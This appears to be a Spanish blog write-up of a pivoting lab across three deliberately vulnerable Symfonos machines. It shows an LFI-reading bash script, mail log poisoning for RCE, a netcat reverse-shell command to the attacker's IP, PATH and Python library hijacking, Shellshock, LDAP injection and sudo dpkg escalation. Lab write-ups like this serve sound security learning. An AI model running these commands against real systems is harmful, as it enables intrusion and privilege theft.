---
layout: single
title: Laboratorio de Pivoting - Symfonos 1,3,5
excerpt: "En este post veremos algunas tecnicas de Pivoting entre 3 maquinas."
date: 2022-10-27
classes: wide
header:
  teaser: /assets/images/labPivoting/Symfonos.png
  teaser_home_page: true
categories:
  - Tecnicas
tags:
  - Pivoting
  - Bash
  - Herramientas
---

<p align="center">
<img src="/assets/images/labPivoting/Symfonos.png" width="400">
<img src="/assets/images/labPivoting/red.png">
</p>

Yo me monté una red de 3 máquinas con 2 redes internas, para poder solo tener acceso a Symfonos 1 e ir pivoteando para ganar acceso a la máquina final que sería Symfonos 5.

# Symfonos 1 
## Enumeración
Comenzamos con la Symfonos 1:

![](/assets/images/labPivoting/1.png)

Ahí vemos que tiene redireccionamiento DNS, a symfonos.local, así que lo agregamos al /etc/hosts.

![](/assets/images/labPivoting/2.png)

Nada raro. Vamos a ver el samba que está corriendo por los puertos 139 y 445.

![](/assets/images/labPivoting/3.png)

Ya sabemos que hay un usuario que se llama helios.

![](/assets/images/labPivoting/4.png)

Probemos estas contraseñas en samba con el usuario helios: 

![](/assets/images/labPivoting/5.png)

Vemos algunos archivos, pero el que nos interesa es el todo.txt

![](/assets/images/labPivoting/6.png)

/h3l105, probemos en la página web.

![](/assets/images/labPivoting/7.png)

## Ganando acceso al Sistema

Enumeremos con wpscan:

![](/assets/images/labPivoting/8.png)

Chan. Mail Masta, un plugin vulnerable a [LFI (Local File Inclusion)](https://lab.wallarm.com/what-is-local-file-inclusion-vulnerability/)

![](/assets/images/labPivoting/9.png)

Versión 1.0.0, lo cuál es vulnerable al exploit 40290.txt de searchsploit
En el exploit nos dice que para leer archivos del servidor mediante Mail Masta, hay que ir a la siguiente ruta: 
``http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send?p/etc/passwd``

![](/assets/images/labPivoting/10.png)

Con esto, nos podemos montar un script en bash que lea el archivo que le pedimos
``lfi.sh``
```bash
#!/bin/bash
#Gracias S4vitar!
function ctrl_c(){
  echo -e "\n\n[!]Saliendo...\n"
  exit 1
}

# Ctrl + C
trap ctrl_c INT

declare -i parameter_counter=0

function fileRead(){
  filename=$1

  echo -e "\n[+] Este es el contenido del archivo $filename:\n"
  curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$filename"
}
function helpPanel(){
  echo -e "\n[i]Uso\n"
  echo -e "\th) Mostrar este panel\n"
  echo -e "\tf) Proporcionar ruta del archivo a leer\n"
}

while getopts "hf:" arg; do
  case $arg in
    h) ;;
    f) filename=$OPTARG; let parameter_counter+=1;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  fileRead "$filename"
else
  helpPanel
fi
```
![](/assets/images/labPivoting/12.png)

Con esto, sabiendo que tiene Mail Masta y el puerto 25 smtp abierto, podemos hacer lo siguiente:

![](/assets/images/labPivoting/13.png)

Para realizar un [RCE (Remote Code Execution)](https://www.geeksforgeeks.org/what-is-remote-code-execution-rce/), hay que hacer lo siguiente desde telnet:
![](/assets/images/labPivoting/14.png)

Entonces ahora, si le hacemos un ``curl -s -X GET "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios"`` 

![](/assets/images/labPivoting/15.png)

Llegó nuestro mail con código malicioso! Ahora para saber si funcionó, hay que sumarle al final de la lína del curl un &cmd=whoami:

![](/assets/images/labPivoting/16.png)

Ahora, para ganar una reverse shell, hay que introducir el comando nc -e /bin/sh 192.168.100.104 1234

![](/assets/images/labPivoting/17.png)

Ganamos acceso al servidor! ahora hay que hacer un [Tratamiento de la TTY](/Tratamiento-de-la-TTY/)

## Escalada de privilegios Vertical

Ahora para la escalada de privilegios, buscamos binarios SUID:

![](/assets/images/labPivoting/18.png)

Vemos uno raro, el /opt/statuscheck
Si lo ejecutamos:

![](/assets/images/labPivoting/19.png)

Obviamente como es un binario y encima el dueño es root, no lo podremos ver, pero lo que podemos hacer es pasarlo a nuestra máquina con el web server de python, para luego mirarlo con el comando strings

![](/assets/images/labPivoting/20.png)

Usa el comando curl, así que para escalara privilegios podríamos hacer un PATH Hijacking y poner a hacer de curl el comando que nosotros quieramos.

![](/assets/images/labPivoting/21.png)

En el ejecutable curl, pusimos chmod u+s /bin/bash, lo que nos asignaría permisos de superusuario a nuestra bash, y luego hicimos que el PATH lea primero los archivos que están en la ruta actual de trabajo, para que al ejecutar el /opt/statuscheck lea primero nuestro curl malicioso.

![](/assets/images/labPivoting/22.png)

Escalamos privilegios!
Ahora la parte de Pivoting.

# Pivoting a Symfonos 3

subimos los binarios ``hostDiscovery.sh`` y ``portDiscovery.sh`` para descubrir hosts desde la primera máquina y luego los puertos abiertos.
Son de fácil uso, y también de fácil edición.
``portDiscovery.sh``
```bash
#!/bin/bash
#Gracias S4vitar!
function ctrl_c(){
  echo -e "\n\n[!] Saliendo..."
  exit 1
}

#Ctrl+C 
trap ctrl_c INT

for port in $(seq 1 65535); do
  timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.128/$port" 2>/dev/null && echo "[+] 10.10.0.128 - PORT $port OPEN"&
done; wait
```
``hostDiscovery.sh``
```bash
#!/bin/bash
#Gracias S4vitar!
#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

#Si no hay parámetros, suponemos funcionamiento para HTP IP: 10.10.10.X
if [ $# -eq 0 ]; then
    for i in $(seq 2 254); do
        timeout 1 bash -c "sudo ping -c 1 10.10.10.$i" 2>/dev/null && echo -e "${blueColour}Host 10.10.10.$i${endColour} \t - ${greenColour}ACTIVE${endColour}" &
    done; wait
    
#Si hay parámetros, tratamos cada uno de los parámetros como una de las 3 primeras partes de la IP: 192 168 0 X
else 
    for j in $(seq 2 254); do
        timeout 1 bash -c "sudo ping -c 1 $1.$2.$3.$j > /dev/null 2>&1" && echo -e "${blueColour}Host $1.$2.$3.$j${endColour} \t - ${greenColour}ACTIVE${endColour}" &
    done; wait
fi
```

![](/assets/images/labPivoting/23.png)

El script de hostDiscovery.sh nos detectó un host distinto al de la primera máquina, y ahora veremos los puertos abiertos:

![](/assets/images/labPivoting/25.png)

Bien, ahora para hacer un escaneo más exhaustivo hay que tirar de Nmap desde nuestra máquina, pero como incialmente nosotros no tenemos conexión directa con la segunda máquina, hay que usar chisel.
Nos bajamos el binario portable de chisel, para luego usar el comando upx para bajarle el peso así lo podamos pasar más rápido.


![](/assets/images/labPivoting/26.png)

Ahora lo subimos con el web server de Python o como vos prefieras, y luego en la máquina vulnerada lo ejecutas de la siguiente manera:

![](/assets/images/labPivoting/27.png)

Y en tu máquina así:

![](/assets/images/labPivoting/28.png)

Pero para que funcione hay que editar el /etc/proxychains.conf de nuestra máquina atacante:

![](/assets/images/labPivoting/29.png)

Tienen que comentar el de socks4, porque si no va a dar problemas.
Ahora, para probar si tenemos conexión, lanzaremos el comando `proxychains nmap -p80 --open -sT -T5 -v -n 10.10.0.136 2>/dev/null`

![](/assets/images/labPivoting/30.png)

 Tenemos conexión!

## Enumeración de Symfonos 3

 Ahora hay que proceder como en un escaneo normal, no olvidandonos de usar proxychains al inicio de cada comando.
 Yo suelo usar este:

 ![](/assets/images/labPivoting/31.png)

 Al querer escanear las versiones de los puertos en cuestión proxychains nos dará algunos errores, pero nada de qué preocuparse.

![](/assets/images/labPivoting/32.png)

 Ahora, si queremos ver la web, obviamente no llegaremos, pero para eso hay que tirar de FoxyProxy.

![](/assets/images/labPivoting/33.png)

 Así, vamos a poder llegar a la web.

![](/assets/images/labPivoting/34.png)

 Si vemos el código fuente:

![](/assets/images/labPivoting/35.png)

 Habla algo de underworld. Vamos a tirar de gobuster para ver si encontramos algo.
![](/assets/images/labPivoting/37.png)

 Importante saber que para declarar el proxy en el gobuster no hace falta usar proxychains, solo con usar el parámetro ``--proxy socks5://127.0.0.1:1080`` ya estaría.

Descubri el directorio /cgi-bin/ (Gracias a la opcion `--add-slash`) pero es Forbidden. Iba a volver a fuzzear pero me acorde de lo que hablaba de underworld:

## Ganando Acceso al Sistema

![](/assets/images/labPivoting/38.png)

Tenemos algo!
parece como si fuera algun comando de consola tipo uptime, y esto me hace acordar a una vulnerabilidad que era muy explotada en 2014, shellshock. Probemos si es vulnerable.
Usaré el exploit 34766.php de searchsploit.

Y ahora para probar, me voy a mandar una shell desde Symfonos 3 a mi máquina, pero no sin 
antes reenviar por TCP todo el tráfico entrante por el puerto 4646 de la Symfonos 1 a mi máquina mediante socat:

![](/assets/images/labPivoting/39.png)

Entonces ahora tenemos que mandar el shellshock de la Symfonos 3 a la Symfonos 1, PERO nosotros tenemos que estar en escucha por el puerto 4646 en NUESTRA máquina, ya que eestamos desviando todo el trafico entrante de Symfonos 1 a nosotros.

![](/assets/images/labPivoting/40.png)

Y llegamos a Symfonos 3!

![](/assets/images/labPivoting/41.png)

## Escalada de Privilegios Horizontal
Si listamos /home, nos encontramos que hay otro usuario aparte de cerberus, hades.
Subí el binario de [pspy](https://github.com/DominicBreuker/pspy) a la Symfonos 3, para listar los procesos que hay en background, y esto fue lo que vi:

![](/assets/images/labPivoting/42.png)

Qué será eso?
Vamos a ver.

![](/assets/images/labPivoting/43.png)

Mmmm denegado.

![](/assets/images/labPivoting/44.png)

Y el dueño es hades. Creo que por acá tenemos nuestra escalada de privilegios horizontal.
Ese script le está mandando datos a FTP, y como FTP es un protocolo de datos en plano(sin encriptar) podríamos interceptarlo con tcpdump.

El comando que use: ``tcpdump -w ftp.pcap -i ens33.``
Pero esto no funcionó. Estaba todo encriptado.
Recorde que estaba enviando todo a traves de la interfaz lo, lo cual me hizo pensar que lo estaba enviando en local, asi que la voy a escanear a esa
Ahora probaré con la interfaz ``lo``.

Para pasarnos un archivo de la Symfonos 3 a nuestra máquina (Acordate que no tenemos conexión directa) Tenemos que pasarlo de máquina en máquina mediante el servidor web de Python.

![](/assets/images/labPivoting/45.png)

Y tenemos las credenciales de Hades.
Bien, ahora ya logeados como hades, procedemos a la escala de privilegios vertical.
## Escalada de Privilegios Vertical

En los binario SUID no hay nada interesante, pero me acordé de la carpeta ftpclient que no podíamos acceder en /opt

![](/assets/images/labPivoting/46.png)

Como a este binario lo está corriendo Root y no lo podemos modificar, pero sí leer, podríamos fijarnos en alguna librería que esté usando para poder inyectar nuestros comandos ahí.

![](/assets/images/labPivoting/47.png)

Está usando ftplib, así que vamos a buscarla en /usr/lib/python2.7/ftplib.py

hacemos nuestro Library Hijacking:

![](/assets/images/labPivoting/49.png)

Si esperamos que root ejecute el binario:

![](/assets/images/labPivoting/50.png)
Y ya escalamos la segunda máquina!
# Pivoting a Symfonos 5

con hostDiscovery, encontramos otra IP diferente a la nuestra.

![](/assets/images/labPivoting/51.png)

Ahora, para hacer un Dynamic Port Forwarding desde la Symfonos 3 (que da cara a la Symfonos 5) hasta nuestra máquina, hay que hacer lo siguiente con chisel:

![](/assets/images/labPivoting/52.png)

Esto desde la Symfonos 3 intentará conectarse a la Symfonos 1:

![](/assets/images/labPivoting/53.png)

Así que desde la Symfonos 1 hay que redigir todo el tráfico con socat a nuestra máquina atacante.
pero para que funcione hay que tocar ciertos parametros del proxychains.conf

![](/assets/images/labPivoting/54.png)

![](/assets/images/labPivoting/55.png)

y si tiramos de nmap para ver si el puerto 80 de la Symfonos 5 está abierto:

![](/assets/images/labPivoting/56.png)

Tenemos conexion!

## Enumeración Symfonos 5
![](/assets/images/labPivoting/57.png)

Vamos a ver la web, acordandonos que hay que usar el FoxyProxy con el puerto 8888.

![](/assets/images/labPivoting/58.png)


Hora de usar el gobuster.

![](/assets/images/labPivoting/59.png)

Creo que con esto nos basta y sobra.
Vamos a ver qué hay en /admin.php

![](/assets/images/labPivoting/60.png)

Un Login, y me suena que esté conectado al LDAP que vemos en la enumeración.
Vamos a ver si se puede hacer un LDAP Injection

![](/assets/images/labPivoting/61.png)

Voy a probar con * de usuario y * de contraseña

Y podemos acceder, y si nos vamos a la parte de portraits vemos esto:

![](/assets/images/labPivoting/62.png)

Por la estructrura de la web, me suea a que podemos leer algun archivo interno:

![](/assets/images/labPivoting/63.png)

Bum.
Ahora para ver el admin.php por dentro, habria que pasarlo a base64 y despues decodificarlo, tal que asi:

![](/assets/images/labPivoting/64.png)

![](/assets/images/labPivoting/65.png)

Ahora si le echamos un ojo:

![](/assets/images/labPivoting/66.png)

tenemos algunas credenciales de LDAP.
si usamos nmap con el script de ldap-search:

![](/assets/images/labPivoting/67.png)

![](/assets/images/labPivoting/68.png)

Tenemos la contraseña de zeus!
Ahora nos conectaremos por SSH:

![](/assets/images/labPivoting/69.png)

Estamos adentro de la 3ra máquina! 
Solo nos queda escalar privilegios.
## Escalada de Privilegios de Symfonos 5

En los binarios SUID no encontramos nada, pero al hacer un sudo -l nos encontramos esto:
![](/assets/images/labPivoting/70.png)

Si nos vamos a gtfobins, nos encontraremos que con dpkg podemos spawnear una consola como root de la siguiente manera
``sudo dpkg -l
!/bin/sh``

![](/assets/images/labPivoting/71.png)

![](/assets/images/labPivoting/72.png)

Esta es nuestra flag final!
